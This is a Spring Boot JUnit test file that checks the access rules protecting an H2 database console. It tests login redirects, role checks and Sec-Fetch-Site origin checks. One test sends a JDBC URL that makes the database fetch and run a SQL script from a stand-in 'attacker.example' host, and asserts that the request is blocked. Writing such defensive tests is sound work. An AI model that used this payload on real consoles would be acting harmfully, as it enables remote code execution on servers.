/*
 *
 *        Copyright (c) 2025-2026 Green Button Alliance, Inc.
 *
 *
 *     Licensed under the Apache License, Version 2.0 (the "License");
 *     you may not use this file except in compliance with the License.
 *     You may obtain a copy of the License at
 *
 *         http://www.apache.org/licenses/LICENSE-2.0
 *
 *     Unless required by applicable law or agreed to in writing, software
 *     distributed under the License is distributed on an "AS IS" BASIS,
 *     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *     See the License for the specific language governing permissions and
 *     limitations under the License.
 *
 */

package org.greenbuttonalliance.espi.thirdparty.config;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.context.ApplicationContext;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.user;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.redirectedUrl;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * The H2 console's own security chain, as on the development profiles that enable the console.
 * Runs on a non-default {@code spring.h2.console.path} to show the rules follow the console's
 * configured path. MockMvc runs only the DispatcherServlet, not the H2 servlet, so a request that
 * passes security ends in 404; a request that security rejects ends in 403 (or a redirect to the
 * login page).
 */
@SpringBootTest(properties = {"spring.h2.console.enabled=true", "spring.h2.console.path=" + H2ConsoleSecurityTest.CONSOLE})
@AutoConfigureMockMvc
@ActiveProfiles("test")
class H2ConsoleSecurityTest {

	static final String CONSOLE = "/dbconsole";

	@Autowired
	private MockMvc mockMvc;

	@Autowired
	private ApplicationContext applicationContext;

	@Test
	@DisplayName("the console's security chain loads where the console is enabled")
	void chain_loads_when_console_enabled() {
		assertThat(applicationContext.getBeanNamesForType(H2ConsoleSecurityConfiguration.class)).hasSize(1);
	}

	@Test
	@DisplayName("not signed in: redirected to the TP login page")
	void anonymous_is_sent_to_login() throws Exception {
		mockMvc.perform(get(CONSOLE + "/").header("Sec-Fetch-Site", "none"))
				.andExpect(status().is3xxRedirection())
				.andExpect(redirectedUrl("/login"));
	}

	@Test
	@DisplayName("a TP customer is refused")
	void customer_is_refused() throws Exception {
		mockMvc.perform(get(CONSOLE + "/").header("Sec-Fetch-Site", "none").with(user("customer").roles("USER")))
				.andExpect(status().isForbidden());
		mockMvc.perform(get(CONSOLE + "/query.do").header("Sec-Fetch-Site", "same-origin")
						.with(user("customer").roles("USER")))
				.andExpect(status().isForbidden());
	}

	@ParameterizedTest
	@ValueSource(strings = {CONSOLE, CONSOLE + "/"})
	@DisplayName("a TP administrator may open the entry page directly (typed URL or bookmark), with same-origin frames allowed")
	void administrator_opens_entry_page_directly(String entry) throws Exception {
		mockMvc.perform(get(entry).header("Sec-Fetch-Site", "none").with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isNotFound())
				.andExpect(header().string("X-Frame-Options", "SAMEORIGIN"));
	}

	@Test
	@DisplayName("a TP administrator's same-origin console requests pass, including tokenless POSTs")
	void administrator_same_origin_requests_pass() throws Exception {
		mockMvc.perform(post(CONSOLE + "/login.do").header("Sec-Fetch-Site", "same-origin")
						.with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isNotFound());
		mockMvc.perform(get(CONSOLE + "/query.do").param("sql", "SELECT 1").header("Sec-Fetch-Site", "same-origin")
						.with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isNotFound());
	}

	@Test
	@DisplayName("a link opened from another application (Sec-Fetch-Site: none) cannot carry a console action")
	void user_initiated_requests_are_limited_to_the_entry_page() throws Exception {
		mockMvc.perform(get(CONSOLE + "/login.do").header("Sec-Fetch-Site", "none")
						.param("url", "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker.example/x.sql'")
						.with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isForbidden());
		mockMvc.perform(get(CONSOLE + "/query.do").param("sql", "SELECT 1").header("Sec-Fetch-Site", "none")
						.with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isForbidden());
		mockMvc.perform(get(CONSOLE + "/").param("sql", "SELECT 1").header("Sec-Fetch-Site", "none")
						.with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isForbidden());
		mockMvc.perform(post(CONSOLE + "/").header("Sec-Fetch-Site", "none").with(user("admin").roles("CUSTODIAN")))
				.andExpect(status().isForbidden());
	}

	@ParameterizedTest
	@ValueSource(strings = {"cross-site", "same-site", ""})
	@DisplayName("an administrator's request sent by a cross-site, other-port or non-browser source is refused")
	void requests_not_from_the_console_origin_are_refused(String secFetchSite) throws Exception {
		var entryRequest = get(CONSOLE + "/").with(user("admin").roles("CUSTODIAN"));
		var postRequest = post(CONSOLE + "/login.do").with(user("admin").roles("CUSTODIAN"));
		if (!secFetchSite.isEmpty()) {
			entryRequest.header("Sec-Fetch-Site", secFetchSite);
			postRequest.header("Sec-Fetch-Site", secFetchSite);
		}
		mockMvc.perform(entryRequest).andExpect(status().isForbidden());
		mockMvc.perform(postRequest).andExpect(status().isForbidden());
	}
}
